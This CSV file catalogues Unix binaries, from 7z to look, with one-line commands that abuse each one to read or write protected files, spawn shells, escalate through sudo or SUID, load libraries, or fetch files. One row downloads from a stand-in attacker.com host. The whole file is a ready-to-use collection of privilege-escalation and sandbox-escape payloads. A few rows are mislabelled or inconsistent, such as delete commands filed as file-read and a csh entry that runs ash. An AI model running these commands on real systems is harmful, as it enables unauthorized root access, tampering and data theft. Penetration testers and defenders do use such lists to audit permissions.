"Name","Function","Code"
"7z","file-read","LFILE=file_to_read ; 7z a -ttar -an -so $LFILE | 7z e -ttar -si -so"
"7z","sudo","LFILE=file_to_read ; sudo 7z a -ttar -an -so $LFILE | 7z e -ttar -si -so"
"alpine","file-read","LFILE=file_to_read ; alpine -F ""$LFILE"""
"alpine","suid","LFILE=file_to_read ; ./alpine -F ""$LFILE"""
"alpine","sudo","LFILE=file_to_read ; sudo alpine -F ""$LFILE"""
"ansible-playbook","shell","TF=$(mktemp) ; echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF ; ansible-playbook $TF"
"ansible-playbook","sudo","TF=$(mktemp) ; echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF ; sudo ansible-playbook $TF"
"apache2ctl","file-read","LFILE=file_to_read ; apache2ctl -c ""Include $LFILE"" -k stop"
"apache2ctl","sudo","LFILE=file_to_read ; sudo apache2ctl -c ""Include $LFILE"" -k stop"
"ar","file-read","TF=$(mktemp -u) ; LFILE=file_to_read ; ar r ""$TF"" ""$LFILE"" ; cat ""$TF"""
"ar","suid","TF=$(mktemp -u) ; LFILE=file_to_read ; ./ar r ""$TF"" ""$LFILE"" ; cat ""$TF"""
"ar","sudo","TF=$(mktemp -u) ; LFILE=file_to_read ; sudo ar r ""$TF"" ""$LFILE"" ; cat ""$TF"""
"aria2c","command","COMMAND='id' ; TF=$(mktemp) ; echo ""$COMMAND"" > $TF ; chmod +x $TF ; aria2c --on-download-error=$TF http://x"
"aria2c","sudo","COMMAND='id' ; TF=$(mktemp) ; echo ""$COMMAND"" > $TF ; chmod +x $TF ; sudo aria2c --on-download-error=$TF http://x"
"aria2c","limited-suid","COMMAND='id' ; TF=$(mktemp) ; echo ""$COMMAND"" > $TF ; chmod +x $TF ; ./aria2c --on-download-error=$TF http://x"
"arp","file-read","LFILE=file_to_read ; arp -v -f ""$LFILE"""
"arp","suid","LFILE=file_to_read ; ./arp -v -f ""$LFILE"""
"arp","sudo","LFILE=file_to_read ; sudo arp -v -f ""$LFILE"""
"as","file-read","LFILE=file_to_read ; as @$LFILE"
"as","suid","LFILE=file_to_read ; ./as @$LFILE"
"as","sudo","LFILE=file_to_read ; sudo as @$LFILE"
"ascii-xfr","file-read","LFILE=file_to_read ; ascii-xfr -ns ""$LFILE"""
"ascii-xfr","suid","LFILE=file_to_read ; ./ascii-xfr -ns ""$LFILE"""
"ascii-xfr","sudo","LFILE=file_to_read ; sudo ascii-xfr -ns ""$LFILE"""
"ascii85","file-read","LFILE=file_to_read ; ascii85 ""$LFILE"" | ascii85 --decode"
"ascii85","sudo","LFILE=file_to_read ; sudo ascii85 ""$LFILE"" | ascii85 --decode"
"ash","file-write","export LFILE=file_to_write ; ash -c 'echo DATA > $LFILE'"
"aspell","file-read","LFILE=file_to_read ; aspell -c ""$LFILE"""
"aspell","suid","LFILE=file_to_read ; ./aspell -c ""$LFILE"""
"aspell","sudo","LFILE=file_to_read ; sudo aspell -c ""$LFILE"""
"at","shell","echo ""/bin/sh <$(tty) >$(tty) 2>$(tty)"" | at now; tail -f /dev/null"
"at","sudo","echo ""/bin/sh <$(tty) >$(tty) 2>$(tty)"" | sudo at now; tail -f /dev/null"
"atobm","file-read","LFILE=file_to_read ; atobm $LFILE 2>&1 | awk -F ""'"" '{printf ""%s"", $2}'"
"atobm","sudo","LFILE=file_to_read ; sudo atobm $LFILE 2>&1 | awk -F ""'"" '{printf ""%s"", $2}'"
"atobm","suid","LFILE=file_to_read ; ./atobm $LFILE 2>&1 | awk -F ""'"" '{printf ""%s"", $2}'"
"awk","file-write","LFILE=file_to_write ; awk -v LFILE=$LFILE 'BEGIN { print ""DATA"" > LFILE }'"
"awk","file-read","LFILE=file_to_read ; awk '//' ""$LFILE"""
"awk","suid","LFILE=file_to_read ; ./awk '//' ""$LFILE"""
"base32","file-read","LFILE=file_to_read ; base32 ""$LFILE"" | base32 --decode"
"base32","suid","LFILE=file_to_read ; base32 ""$LFILE"" | base32 --decode"
"base32","sudo","LFILE=file_to_read ; sudo base32 ""$LFILE"" | base32 --decode"
"base58","file-read","LFILE=file_to_read ; base58 ""$LFILE"" | base58 --decode"
"base58","sudo","LFILE=file_to_read ; sudo base58 ""$LFILE"" | base58 --decode"
"base64","file-read","LFILE=file_to_read ; base64 ""$LFILE"" | base64 --decode"
"base64","suid","LFILE=file_to_read ; ./base64 ""$LFILE"" | base64 --decode"
"base64","sudo","LFILE=file_to_read ; sudo base64 ""$LFILE"" | base64 --decode"
"basenc","file-read","LFILE=file_to_read ; basenc --base64 $LFILE | basenc -d --base64"
"basenc","suid","LFILE=file_to_read ; basenc --base64 $LFILE | basenc -d --base64"
"basenc","sudo","LFILE=file_to_read ; sudo basenc --base64 $LFILE | basenc -d --base64"
"basez","file-read","LFILE=file_to_read ; basez ""$LFILE"" | basez --decode"
"basez","suid","LFILE=file_to_read ; ./basez ""$LFILE"" | basez --decode"
"basez","sudo","LFILE=file_to_read ; sudo basez ""$LFILE"" | basez --decode"
"bash","file-write","export LFILE=file_to_write ; bash -c 'echo DATA > $LFILE'"
"batcat","shell","batcat --paging always /etc/profile ; !/bin/sh"
"batcat","limited-suid","./batcat --paging always /etc/profile ; !/bin/sh"
"batcat","sudo","sudo batcat --paging always /etc/profile ; !/bin/sh"
"bc","file-read","LFILE=file_to_read ; bc -s $LFILE ; quit"
"bc","sudo","LFILE=file_to_read ; sudo bc -s $LFILE ; quit"
"bc","suid","LFILE=file_to_read ; ./bc -s $LFILE ; quit"
"bconsole","shell","bconsole ; @exec /bin/sh"
"bconsole","sudo","sudo bconsole ; @exec /bin/sh"
"bpftrace","sudo","TF=$(mktemp) ; echo 'BEGIN {system(""/bin/sh"");exit()}' >$TF ; sudo bpftrace $TF"
"bridge","file-read","LFILE=file_to_read ; bridge -b ""$LFILE"""
"bridge","suid","LFILE=file_to_read ; ./bridge -b ""$LFILE"""
"bridge","sudo","LFILE=file_to_read ; sudo bridge -b ""$LFILE"""
"bundle","shell","export BUNDLE_GEMFILE=x ; bundle exec /bin/sh"
"bundle","shell","TF=$(mktemp -d) ; touch $TF/Gemfile ; cd $TF ; bundle exec /bin/sh"
"bundle","shell","TF=$(mktemp -d) ; echo 'system(""/bin/sh"")' > $TF/Gemfile ; cd $TF ; bundle install"
"bundler","shell","export BUNDLE_GEMFILE=x ; bundler exec /bin/sh"
"bundler","shell","TF=$(mktemp -d) ; touch $TF/Gemfile ; cd $TF ; bundler exec /bin/sh"
"bundler","shell","TF=$(mktemp -d) ; echo 'system(""/bin/sh"")' > $TF/Gemfile ; cd $TF ; bundler install"
"busctl","shell","busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'"
"busctl","sudo","sudo busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'"
"busctl","suid","./busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'"
"busybox","file-write","LFILE=file_to_write ; busybox sh -c 'echo ""DATA"" > $LFILE'"
"busybox","file-read","LFILE=file_to_read ; ./busybox cat ""$LFILE"""
"byebug","shell","TF=$(mktemp) ; echo 'system(""/bin/sh"")' > $TF ; byebug $TF ; continue"
"byebug","limited-suid","TF=$(mktemp) ; echo 'system(""/bin/sh"")' > $TF ; ./byebug $TF ; continue"
"byebug","sudo","TF=$(mktemp) ; echo 'system(""/bin/sh"")' > $TF ; sudo byebug $TF ; continue"
"bzip2","file-read","LFILE=file_to_read ; bzip2 -c $LFILE | bzip2 -d"
"bzip2","suid","LFILE=file_to_read ; ./bzip2 -c $LFILE | bzip2 -d"
"bzip2","sudo","LFILE=file_to_read ; sudo bzip2 -c $LFILE | bzip2 -d"
"c89","file-read","LFILE=file_to_read ; c89 -x c -E ""$LFILE"""
"c89","file-read","LFILE=file_to_delete ; c89 -xc /dev/null -o $LFILE"
"c99","file-read","LFILE=file_to_read ; c99 -x c -E ""$LFILE"""
"c99","file-read","LFILE=file_to_delete ; c99 -xc /dev/null -o $LFILE"
"cat","file-read","LFILE=file_to_read ; cat ""$LFILE"""
"cat","suid","LFILE=file_to_read ; ./cat ""$LFILE"""
"cat","sudo","LFILE=file_to_read ; sudo cat ""$LFILE"""
"certbot","shell","TF=$(mktemp -d) ; certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'"
"certbot","sudo","TF=$(mktemp -d) ; sudo certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'"
"check_cups","file-read","LFILE=file_to_read ; check_cups --extra-opts=@$LFILE"
"check_cups","sudo","LFILE=file_to_read ; sudo check_cups --extra-opts=@$LFILE"
"check_log","file-read","LFILE=file_to_read ; OUTPUT=output_file ; check_log -F $LFILE -O $OUTPUT ; cat $OUTPUT"
"check_log","file-write","LFILE=file_to_write ; INPUT=input_file ; check_log -F $INPUT -O $LFILE"
"check_log","sudo","LFILE=file_to_write ; INPUT=input_file ; sudo check_log -F $INPUT -O $LFILE"
"check_memory","file-read","LFILE=file_to_read ; check_memory --extra-opts=@$LFILE"
"check_memory","sudo","LFILE=file_to_read ; sudo check_memory --extra-opts=@$LFILE"
"check_raid","file-read","LFILE=file_to_read ; check_raid --extra-opts=@$LFILE"
"check_raid","sudo","LFILE=file_to_read ; sudo check_raid --extra-opts=@$LFILE"
"check_statusfile","file-read","LFILE=file_to_read ; check_statusfile $LFILE"
"check_statusfile","sudo","LFILE=file_to_read ; sudo check_statusfile $LFILE"
"chmod","suid","LFILE=file_to_change ; ./chmod 6777 $LFILE"
"chmod","sudo","LFILE=file_to_change ; sudo chmod 6777 $LFILE"
"chown","suid","LFILE=file_to_change ; ./chown $(id -un):$(id -gn) $LFILE"
"chown","sudo","LFILE=file_to_change ; sudo chown $(id -un):$(id -gn) $LFILE"
"chroot","suid","./chroot / /bin/sh -p"
"chroot","sudo","sudo chroot /"
"clamscan","file-read","LFILE=file_to_read ; TF=$(mktemp -d) ; touch $TF/empty.yara ; clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'"
"clamscan","suid","LFILE=file_to_read ; TF=$(mktemp -d) ; touch $TF/empty.yara ; ./clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'"
"clamscan","sudo","LFILE=file_to_read ; TF=$(mktemp -d) ; touch $TF/empty.yara ; sudo clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'"
"cmp","file-read","LFILE=file_to_read ; cmp $LFILE /dev/zero -b -l"
"cmp","suid","LFILE=file_to_read ; ./cmp $LFILE /dev/zero -b -l"
"cmp","sudo","LFILE=file_to_read ; sudo cmp $LFILE /dev/zero -b -l"
"cobc","shell","TF=$(mktemp -d) ; echo 'CALL ""SYSTEM"" USING ""/bin/sh"".' > $TF/x ; cobc -xFj --frelax-syntax-checks $TF/x"
"cobc","sudo","TF=$(mktemp -d) ; echo 'CALL ""SYSTEM"" USING ""/bin/sh"".' > $TF/x ; sudo cobc -xFj --frelax-syntax-checks $TF/x"
"column","file-read","LFILE=file_to_read ; column $LFILE"
"column","suid","LFILE=file_to_read ; ./column $LFILE"
"column","sudo","LFILE=file_to_read ; sudo column $LFILE"
"comm","file-read","LFILE=file_to_read ; comm $LFILE /dev/null 2>/dev/null"
"comm","suid","LFILE=file_to_read ; comm $LFILE /dev/null 2>/dev/null"
"comm","sudo","LFILE=file_to_read ; sudo comm $LFILE /dev/null 2>/dev/null"
"composer","shell","TF=$(mktemp -d) ; echo '{""scripts"":{""x"":""/bin/sh -i 0<&3 1>&3 2>&3""}}' >$TF/composer.json ; composer --working-dir=$TF run-script x"
"composer","limited-suid","TF=$(mktemp -d) ; echo '{""scripts"":{""x"":""/bin/sh -i 0<&3 1>&3 2>&3""}}' >$TF/composer.json ; ./composer --working-dir=$TF run-script x"
"composer","sudo","TF=$(mktemp -d) ; echo '{""scripts"":{""x"":""/bin/sh -i 0<&3 1>&3 2>&3""}}' >$TF/composer.json ; sudo composer --working-dir=$TF run-script x"
"cowsay","shell","TF=$(mktemp) ; echo 'exec ""/bin/sh"";' >$TF ; cowsay -f $TF x"
"cowsay","sudo","TF=$(mktemp) ; echo 'exec ""/bin/sh"";' >$TF ; sudo cowsay -f $TF x"
"cowthink","shell","TF=$(mktemp) ; echo 'exec ""/bin/sh"";' >$TF ; cowthink -f $TF x"
"cowthink","sudo","TF=$(mktemp) ; echo 'exec ""/bin/sh"";' >$TF ; sudo cowthink -f $TF x"
"cp","file-read","LFILE=file_to_read ; cp ""$LFILE"" /dev/stdout"
"cp","file-write","LFILE=file_to_write ; echo ""DATA"" | cp /dev/stdin ""$LFILE"""
"cp","suid","LFILE=file_to_write ; echo ""DATA"" | ./cp /dev/stdin ""$LFILE"""
"cp","sudo","LFILE=file_to_write ; echo ""DATA"" | sudo cp /dev/stdin ""$LFILE"""
"cpan","sudo","sudo cpan ; ! exec '/bin/bash'"
"cpio","shell","echo '/bin/sh </dev/tty >/dev/tty' >localhost ; cpio -o --rsh-command /bin/sh -F localhost:"
"cpio","sudo","echo '/bin/sh </dev/tty >/dev/tty' >localhost ; sudo cpio -o --rsh-command /bin/sh -F localhost:"
"crash","command","COMMAND='/usr/bin/id' ; CRASHPAGER=""$COMMAND"" crash -h"
"csh","file-write","export LFILE=file_to_write ; ash -c 'echo DATA > $LFILE'"
"csplit","file-read","LFILE=file_to_read ; csplit $LFILE 1 ; cat xx01"
"csplit","suid","LFILE=file_to_read ; csplit $LFILE 1 ; cat xx01"
"csplit","sudo","LFILE=file_to_read ; csplit $LFILE 1 ; cat xx01"
"csvtool","suid","LFILE=file_to_read ; ./csvtool trim t $LFILE"
"cupsfilter","file-read","LFILE=file_to_read ; cupsfilter -i application/octet-stream -m application/octet-stream $LFILE"
"cupsfilter","sudo","LFILE=file_to_read ; sudo cupsfilter -i application/octet-stream -m application/octet-stream $LFILE"
"cupsfilter","suid","LFILE=file_to_read ; ./cupsfilter -i application/octet-stream -m application/octet-stream $LFILE"
"cut","file-read","LFILE=file_to_read ; cut -d """" -f1 ""$LFILE"""
"cut","suid","LFILE=file_to_read ; ./cut -d """" -f1 ""$LFILE"""
"cut","sudo","LFILE=file_to_read ; sudo cut -d """" -f1 ""$LFILE"""
"dash","file-write","export LFILE=file_to_write ; dash -c 'echo DATA > $LFILE'"
"date","file-read","LFILE=file_to_read ; date -f $LFILE"
"date","suid","LFILE=file_to_read ; ./date -f $LFILE"
"date","sudo","LFILE=file_to_read ; sudo date -f $LFILE"
"dd","file-write","LFILE=file_to_write ; echo ""DATA"" | dd of=$LFILE"
"dd","file-read","LFILE=file_to_read ; dd if=$LFILE"
"dd","suid","LFILE=file_to_write ; echo ""data"" | ./dd of=$LFILE"
"dd","sudo","LFILE=file_to_write ; echo ""data"" | sudo dd of=$LFILE"
"debugfs","shell","debugfs ; !/bin/sh"
"debugfs","suid","./debugfs ; !/bin/sh"
"debugfs","sudo","sudo debugfs ; !/bin/sh"
"dialog","file-read","LFILE=file_to_read ; dialog --textbox ""$LFILE"" 0 0"
"dialog","suid","LFILE=file_to_read ; ./dialog --textbox ""$LFILE"" 0 0"
"dialog","sudo","LFILE=file_to_read ; sudo dialog --textbox ""$LFILE"" 0 0"
"diff","file-read","LFILE=file_to_read ; diff --line-format=%L /dev/null $LFILE"
"diff","suid","LFILE=file_to_read ; ./diff --line-format=%L /dev/null $LFILE"
"diff","sudo","LFILE=file_to_read ; sudo diff --line-format=%L /dev/null $LFILE"
"dig","file-read","LFILE=file_to_read ; dig -f $LFILE"
"dig","sudo","LFILE=file_to_read ; sudo dig -f $LFILE"
"dig","suid","LFILE=file_to_read ; ./dig -f $LFILE"
"dmsetup","sudo","sudo dmsetup create base <<EOF ; 0 3534848 linear /dev/loop0 94208 ; EOF ; sudo dmsetup ls --exec '/bin/sh -s'"
"dmsetup","suid","./dmsetup create base <<EOF ; 0 3534848 linear /dev/loop0 94208 ; EOF ; ./dmsetup ls --exec '/bin/sh -p -s'"
"dotnet","shell","dotnet fsi ; System.Diagnostics.Process.Start(""/bin/sh"").WaitForExit();;"
"dotnet","file-read","export LFILE=file_to_read ; dotnet fsi ; System.IO.File.ReadAllText(System.Environment.GetEnvironmentVariable(""LFILE""));;"
"dotnet","sudo","sudo dotnet fsi ; System.Diagnostics.Process.Start(""/bin/sh"").WaitForExit();;"
"dstat","shell","mkdir -p ~/.dstat ; echo 'import os; os.execv(""/bin/sh"", [""sh""])' >~/.dstat/dstat_xxx.py ; dstat --xxx"
"dstat","sudo","echo 'import os; os.execv(""/bin/sh"", [""sh""])' >/usr/local/share/dstat/dstat_xxx.py ; sudo dstat --xxx"
"dvips","shell","tex '\special{psfile=""`/bin/sh 1>&0""}\end' ; dvips -R0 texput.dvi"
"dvips","sudo","tex '\special{psfile=""`/bin/sh 1>&0""}\end' ; sudo dvips -R0 texput.dvi"
"dvips","limited-suid","tex '\special{psfile=""`/bin/sh 1>&0""}\end' ; ./dvips -R0 texput.dvi"
"easy_install","shell","TF=$(mktemp -d) ; echo ""import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')"" > $TF/setup.py ; easy_install $TF"
"easy_install","library-load","TF=$(mktemp -d) ; echo 'from ctypes import cdll; cdll.LoadLibrary(""lib.so"")' > $TF/setup.py ; easy_install $TF"
"easy_install","sudo","TF=$(mktemp -d) ; echo ""import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')"" > $TF/setup.py ; sudo easy_install $TF"
"eb","shell","eb logs ; !/bin/sh"
"eb","sudo","sudo eb logs ; !/bin/sh"
"ed","shell","ed ; !/bin/sh"
"ed","file-write","ed file_to_write ; a ; DATA ; . ; w ; q"
"ed","file-read","ed file_to_read ; ,p ; q"
"ed","suid","./ed file_to_read ; ,p ; q"
"ed","sudo","sudo ed ; !/bin/sh"
"ed","limited-suid","./ed ; !/bin/sh"
"efax","suid","LFILE=file_to_read ; ./efax -d ""$LFILE"""
"efax","sudo","LFILE=file_to_read ; sudo efax -d ""$LFILE"""
"elvish","file-read","export LFILE=file_to_read ; elvish -c 'echo (slurp <$E:LFILE)'"
"elvish","file-write","export LFILE=file_to_write ; elvish -c 'echo DATA >$E:LFILE'"
"emacs","file-write","emacs file_to_write ; DATA ; C-x C-s"
"eqn","file-read","LFILE=file_to_read ; eqn ""$LFILE"""
"eqn","suid","LFILE=file_to_read ; ./eqn ""$LFILE"""
"eqn","sudo","LFILE=file_to_read ; sudo eqn ""$LFILE"""
"espeak","file-read","LFILE=file_to_read ; espeak -qXf ""$LFILE"""
"espeak","suid","LFILE=file_to_read ; ./espeak -qXf ""$LFILE"""
"espeak","sudo","LFILE=file_to_read ; sudo espeak -qXf ""$LFILE"""
"ex","shell","ex ; !/bin/sh"
"ex","file-write","ex file_to_write ; a ; DATA ; . ; w ; q"
"ex","file-read","ex file_to_read ; ,p ; q"
"ex","sudo","sudo ex ; !/bin/sh"
"exiftool","file-read","LFILE=file_to_read ; OUTPUT=output_file ; exiftool -filename=$OUTPUT $LFILE ; cat $OUTPUT"
"exiftool","file-write","LFILE=file_to_write ; INPUT=input_file ; exiftool -filename=$LFILE $INPUT"
"exiftool","sudo","LFILE=file_to_write ; INPUT=input_file ; sudo exiftool -filename=$LFILE $INPUT"
"expand","file-read","LFILE=file_to_read ; expand ""$LFILE"""
"expand","suid","LFILE=file_to_read ; ./expand ""$LFILE"""
"expand","sudo","LFILE=file_to_read ; sudo expand ""$LFILE"""
"facter","shell","TF=$(mktemp -d) ; echo 'exec(""/bin/sh"")' > $TF/x.rb ; FACTERLIB=$TF facter"
"facter","sudo","TF=$(mktemp -d) ; echo 'exec(""/bin/sh"")' > $TF/x.rb ; sudo FACTERLIB=$TF facter"
"fold","file-read","LFILE=file_to_read ; fold -w99999999 ""$LFILE"""
"fold","suid","LFILE=file_to_read ; ./fold -w99999999 ""$LFILE"""
"fold","sudo","LFILE=file_to_read ; sudo fold -w99999999 ""$LFILE"""
"fping","file-read","LFILE=file_to_read ; fping -f $LFILE"
"fping","sudo","LFILE=file_to_read ; sudo fping -f $LFILE"
"ftp","shell","ftp ; !/bin/sh"
"ftp","sudo","sudo ftp ; !/bin/sh"
"gawk","file-write","LFILE=file_to_write ; gawk -v LFILE=$LFILE 'BEGIN { print ""DATA"" > LFILE }'"
"gawk","file-read","LFILE=file_to_read ; gawk '//' ""$LFILE"""
"gawk","suid","LFILE=file_to_read ; ./gawk '//' ""$LFILE"""
"gcc","file-read","LFILE=file_to_read ; gcc -x c -E ""$LFILE"""
"gcc","file-read","LFILE=file_to_delete ; gcc -xc /dev/null -o $LFILE"
"genisoimage","file-read","LFILE=file_to_read ; genisoimage -q -o - ""$LFILE"""
"genisoimage","sudo","LFILE=file_to_read ; sudo genisoimage -q -o - ""$LFILE"""
"ghci","shell","ghci ; System.Process.callCommand ""/bin/sh"""
"ghci","sudo","sudo ghci ; System.Process.callCommand ""/bin/sh"""
"gimp","file-write","gimp -idf --batch-interpreter=python-fu-eval -b 'open(""file_to_write"", ""wb"").write(""DATA"")'"
"ginsh","shell","ginsh ; !/bin/sh"
"ginsh","limited-suid","./ginsh ; !/bin/sh"
"ginsh","sudo","sudo ginsh ; !/bin/sh"
"git","shell","TF=$(mktemp -d) ; ln -s /bin/sh ""$TF/git-x"" ; git ""--exec-path=$TF"" x"
"git","sudo","TF=$(mktemp -d) ; ln -s /bin/sh ""$TF/git-x"" ; sudo git ""--exec-path=$TF"" x"
"grep","file-read","LFILE=file_to_read ; grep '' $LFILE"
"grep","suid","LFILE=file_to_read ; ./grep '' $LFILE"
"grep","sudo","LFILE=file_to_read ; sudo grep '' $LFILE"
"gtester","shell","TF=$(mktemp) ; echo '#!/bin/sh' > $TF ; echo 'exec /bin/sh -p 0<&1' >> $TF ; chmod +x $TF ; gtester -q $TF"
"gtester","sudo","TF=$(mktemp) ; echo '#!/bin/sh' > $TF ; echo 'exec /bin/sh 0<&1' >> $TF ; chmod +x $TF ; sudo gtester -q $TF"
"gtester","suid","TF=$(mktemp) ; echo '#!/bin/sh -p' > $TF ; echo 'exec /bin/sh -p 0<&1' >> $TF ; chmod +x $TF ; sudo gtester -q $TF"
"gzip","file-read","LFILE=file_to_read ; gzip -f $LFILE -t"
"gzip","file-read","LFILE=file_to_read ; gzip -c $LFILE | gzip -d"
"gzip","suid","LFILE=file_to_read ; ./gzip -f $LFILE -t"
"gzip","sudo","LFILE=file_to_read ; sudo gzip -f $LFILE -t"
"hd","file-read","LFILE=file_to_read ; hd ""$LFILE"""
"hd","suid","LFILE=file_to_read ; ./hd ""$LFILE"""
"hd","sudo","LFILE=file_to_read ; sudo hd ""$LFILE"""
"head","file-read","LFILE=file_to_read ; head -c1G ""$LFILE"""
"head","suid","LFILE=file_to_read ; ./head -c1G ""$LFILE"""
"head","sudo","LFILE=file_to_read ; sudo head -c1G ""$LFILE"""
"hexdump","file-read","LFILE=file_to_read ; hexdump -C ""$LFILE"""
"hexdump","suid","LFILE=file_to_read ; ./hexdump -C ""$LFILE"""
"hexdump","sudo","LFILE=file_to_read ; sudo hexdump -C ""$LFILE"""
"highlight","file-read","LFILE=file_to_read ; highlight --no-doc --failsafe ""$LFILE"""
"highlight","suid","LFILE=file_to_read ; ./highlight --no-doc --failsafe ""$LFILE"""
"highlight","sudo","LFILE=file_to_read ; sudo highlight --no-doc --failsafe ""$LFILE"""
"hping3","shell","hping3 ; /bin/sh"
"hping3","suid","./hping3 ; /bin/sh -p"
"hping3","sudo","sudo hping3 ; /bin/sh"
"iconv","file-write","LFILE=file_to_write ; echo ""DATA"" | iconv -f 8859_1 -t 8859_1 -o ""$LFILE"""
"iconv","file-read","LFILE=file_to_read ; iconv -f 8859_1 -t 8859_1 ""$LFILE"""
"iconv","suid","LFILE=file_to_read ; ./iconv -f 8859_1 -t 8859_1 ""$LFILE"""
"iconv","sudo","LFILE=file_to_read ; ./iconv -f 8859_1 -t 8859_1 ""$LFILE"""
"iftop","shell","iftop ; !/bin/sh"
"iftop","limited-suid","./iftop ; !/bin/sh"
"iftop","sudo","sudo iftop ; !/bin/sh"
"install","suid","LFILE=file_to_change ; TF=$(mktemp) ; ./install -m 6777 $LFILE $TF"
"install","sudo","LFILE=file_to_change ; TF=$(mktemp) ; sudo install -m 6777 $LFILE $TF"
"ip","file-read","LFILE=file_to_read ; ip -force -batch ""$LFILE"""
"ip","suid","LFILE=file_to_read ; ./ip -force -batch ""$LFILE"""
"ip","sudo","LFILE=file_to_read ; sudo ip -force -batch ""$LFILE"""
"irb","shell","irb ; exec '/bin/bash'"
"irb","file-write","irb ; File.open(""file_to_write"", ""w+"") { |f| f.write(""DATA"") }"
"irb","file-read","irb ; puts File.read(""file_to_read"")"
"irb","library-load","irb ; require ""fiddle""; Fiddle.dlopen(""lib.so"")"
"irb","sudo","sudo irb ; exec '/bin/bash'"
"ispell","shell","ispell /etc/passwd ; !/bin/sh"
"ispell","suid","./ispell /etc/passwd ; !/bin/sh -p"
"ispell","sudo","sudo ispell /etc/passwd ; !/bin/sh"
"jjs","file-write","echo 'var FileWriter = Java.type(""java.io.FileWriter""); ; var fw=new FileWriter(""./file_to_write""); ; fw.write(""DATA""); ; fw.close();' | jjs"
"jjs","file-read","echo 'var BufferedReader = Java.type(""java.io.BufferedReader""); ; var FileReader = Java.type(""java.io.FileReader""); ; var br = new BufferedReader(new FileReader(""file_to_read"")); ; while ((line = br.readLine()) != null) { print(line); }' | jjs"
"joe","shell","joe ; ^K!/bin/sh"
"joe","limited-suid","./joe ; ^K!/bin/sh"
"joe","sudo","sudo joe ; ^K!/bin/sh"
"join","file-read","LFILE=file_to_read ; join -a 2 /dev/null $LFILE"
"join","suid","LFILE=file_to_read ; ./join -a 2 /dev/null $LFILE"
"join","sudo","LFILE=file_to_read ; sudo join -a 2 /dev/null $LFILE"
"journalctl","shell","journalctl ; !/bin/sh"
"journalctl","sudo","sudo journalctl ; !/bin/sh"
"jq","file-read","LFILE=file_to_read ; jq -Rr . ""$LFILE"""
"jq","suid","LFILE=file_to_read ; ./jq -Rr . ""$LFILE"""
"jq","sudo","LFILE=file_to_read ; sudo jq -Rr . ""$LFILE"""
"jtag","shell","jtag --interactive ; shell /bin/sh"
"jtag","sudo","sudo jtag --interactive ; shell /bin/sh"
"julia","shell","julia -e 'run(`/bin/sh`)'"
"julia","file-read","export LFILE=file_to_read ; julia -e 'print(open(f->read(f, String), ENV[""LFILE""]))'"
"julia","file-write","export LFILE=file_to_write ; julia -e 'open(f->write(f, ""DATA""), ENV[""LFILE""], ""w"")'"
"julia","file-download","export URL=http://attacker.com/file_to_get ; export LFILE=file_to_save ; julia -e 'download(ENV[""URL""], ENV[""LFILE""])'"
"julia","suid","./julia -e 'run(`/bin/sh -p`)'"
"julia","sudo","sudo julia -e 'run(`/bin/sh`)'"
"knife","shell","knife exec -E 'exec ""/bin/sh""'"
"knife","sudo","sudo knife exec -E 'exec ""/bin/sh""'"
"ksh","file-write","export LFILE=file_to_write ; ksh -c 'echo DATA > $LFILE'"
"ksshell","file-read","LFILE=file_to_read ; ksshell -i $LFILE"
"ksshell","suid","LFILE=file_to_read ; ./ksshell -i $LFILE"
"ksshell","sudo","LFILE=file_to_read ; sudo ksshell -i $LFILE"
"kubectl","file-upload","LFILE=dir_to_serve ; kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/"
"kubectl","suid","LFILE=dir_to_serve ; ./kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/"
"kubectl","sudo","LFILE=dir_to_serve ; sudo kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/"
"latex","shell","latex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'"
"latex","sudo","sudo latex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'"
"latex","limited-suid","./latex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'"
"latexmk","shell","latexmk -e 'exec ""/bin/sh"";'"
"latexmk","shell","latexmk -latex='/bin/sh #' /dev/null"
"latexmk","file-read","latexmk -e 'open(X,""/etc/passwd"");while(<X>){print $_;}exit'"
"less","shell","less /etc/profile ; !/bin/sh"
"less","shell","VISUAL=""/bin/sh -c '/bin/sh'"" less /etc/profile ; v"
"less","shell","less /etc/profile ; v:shell"
"less","file-write","echo DATA | less ; sfile_to_write ; q"
"less","sudo","sudo less /etc/profile ; !/bin/sh"
"links","file-read","LFILE=file_to_read ; links ""$LFILE"""
"links","suid","LFILE=file_to_read ; ./links ""$LFILE"""
"links","sudo","LFILE=file_to_read ; sudo links ""$LFILE"""
"ln","sudo","sudo ln -fs /bin/sh /bin/ln ; sudo ln"
"loginctl","shell","loginctl user-status ; !/bin/sh"
"loginctl","sudo","sudo loginctl user-status ; !/bin/sh"
"look","file-read","LFILE=file_to_read ; look '' ""$LFILE"""
"look","suid","LFILE=file_to_read ; ./look '' ""$LFILE"""
